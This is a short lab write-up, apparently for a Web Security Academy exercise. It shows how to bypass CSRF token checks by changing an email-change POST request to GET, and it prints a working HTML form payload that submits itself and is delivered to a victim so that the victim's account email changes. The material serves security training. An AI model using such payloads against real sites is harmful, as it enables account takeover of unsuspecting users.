## Solution steps

- Login using the provided credentials.
- Open Burp Suite and set-up proxy.
- Update the email from the website.
- Navigate to HTTP history in Burp and find the `POST` request `/my-account/change-email`.
- Send the request to Burp Repeater and observe that if you change the value of the csrf parameter then the request is rejected.
- Use "Change request method" on the context menu to convert it into a GET request and observe that the CSRF token is no longer verified.
- Copy the contents of the request and paste it in an online CSRF PoC Generator. I used: https://hacktify.in/csrf/
- Remove the `csrf` token as we don't need it.
- Paste it in the `Body`.
  ```
  <html>
	  <body>
		  <form method="GET" action="https://xxxxx.web-security-academy.net/my-account/change-email?email=test@normal-user.net">
			  <input type="hidden" name="email" value="test@normal-user.net"/>
			  <input type="submit" value="Submit">
		  </form>
	  </body>
  <html>
  ```
- Click `Store` and then click the `View exploit` button.
- Click `submit` and notice your email id has changed to `test@normal-user.net`.
- Add `<script>document.forms[0].submit();</script>` to the payload so you don't have to click the `submit` button.
- Your final payload should look like this:
  ```
  <html>
  	<body>
  		<form method="GET" action="https://xxxxx.web-security-academy.net/my-account/change-email?email=pentester@normal-user.net">
  			<input type="hidden" name="email" value="pentester@normal-user.net"/>
  			<input type="submit" value="Submit">
  		</form>
  <script>
          document.forms[0].submit();
  </script>
  	</body>
  <html>
  ```
- Click `Store` then `Deliver exploit to victim`.
